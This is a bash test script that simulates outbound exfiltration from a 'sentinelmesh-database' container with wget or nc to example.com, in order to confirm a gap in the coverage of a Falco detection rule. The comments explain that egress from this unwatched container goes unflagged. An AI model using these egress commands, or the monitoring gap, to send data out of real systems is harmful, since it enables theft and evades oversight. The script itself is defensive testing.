#!/bin/bash
# Held-out variant of S8 (Unexpected Outbound Connection / Exfiltration, T1041).
# Original: curl to an external host from sentinelmesh-webapp.
# Variant : the same outbound exfiltration, but from sentinelmesh-database
# instead of the webapp, using busybox tools in the alpine image. The Falco
# rule only watches sentinelmesh-webapp and sentinelmesh-authservice, so an
# egress from the database container is NOT flagged - a detection GAP. Same
# "no egress restriction" weakness, from a container the rule does not cover.
# Expected: detection GAP.
echo "========================================="
echo "S8 held-out variant - egress from the database container"
echo "========================================="
docker exec sentinelmesh-database sh -c '
  if command -v wget >/dev/null 2>&1; then
    wget -q -T 5 -O /dev/null http://example.com 2>/dev/null
  elif command -v nc >/dev/null 2>&1; then
    printf "GET / HTTP/1.0\r\n\r\n" | nc -w 5 example.com 80 >/dev/null 2>&1
  else
    getent hosts example.com >/dev/null 2>&1
  fi
' || true
echo
echo "[done] Outbound request attempted from database container."
